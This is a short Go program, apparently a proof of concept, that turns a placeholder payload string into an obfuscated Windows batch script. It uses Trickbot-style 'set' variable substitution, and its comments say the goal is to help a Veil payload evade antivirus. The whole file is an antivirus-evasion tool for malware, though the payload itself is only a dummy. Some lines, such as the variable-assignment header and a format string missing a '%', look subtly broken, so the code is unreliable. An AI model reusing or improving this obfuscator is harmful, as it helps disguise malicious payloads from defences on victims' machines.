package main

import (
	"fmt"
	"strings"
)


// Overly simplified Trickbot obfuscation of rawFileOutPut - Veil batch payload that MAYBE evade AV 
// Very PoC 
// Made for and only for educational use 
// Need to refactor out into seperate functions

func main() {
	builder := strings.Builder{}

	rawFileOutput := "ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ"
	batchHeader := "@echo off"
	trickbotHeader := "AAA=set\n%AAA% BBB= \n%AAA%%BBB%CCC==\n"
	trickbotWhitespace := "%BBB%"
	trickbotSetWS := "%AAA%%BBB"
	trickbotEquals := "%CCC%"
	splitPayload := strings.SplitN(rawFileOutput, " ", -1)

	// Create Variable array to hold generate variable names
	variableNameAmount := len(splitPayload)
	//Make a Patternlength =  X * VariableNameLen - 37 * 3 = 111
	// msfvenom-pattern_create $Patternlength
	variablePattern := "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6"
	patterns := strings.Split(variablePattern, "A")
	trickbotPayloadVariables := initStrArray(variableNameAmount)
	// Format Pattern
	for i := 0; i <= variableNameAmount-1; i++ {
		builder.WriteString("%A" + patterns[i] + "%")
		trickbotPayloadVariables[i] = builder.String()
		builder.Reset()
	}

	//Write Variable assignment to payloadPart
	for i := 0; i <= variableNameAmount-1; i++ {
		builder.WriteString(trickbotSetWS + trickbotPayloadVariables[i] + trickbotEquals + splitPayload[i] + "\n")
	}
	builder.WriteString("\n")
	translatePayloadListing := builder.String()
	builder.Reset()

	// Write out the obfuscatedPayload payload
	// Replacing payload whitespace with assigned ws variable
	for i := 0; i <= variableNameAmount-1; i++ {
		builder.WriteString(trickbotPayloadVariables[i] + trickbotWhitespace)
	}
	builder.WriteString("\n")
	obfuscatedPayload := builder.String()
	builder.Reset()

	//Print output linearly
	fmt.Println(batchHeader)
	fmt.Println(trickbotHeader)
	fmt.Println(translatePayloadListing)
	fmt.Println(obfuscatedPayload)
}

func initStrArray(n int) []string {
	result := make([]string, n)
	for i := 0; i <= n-1; i++ {
		result[i] = ""
	}
	return result
}
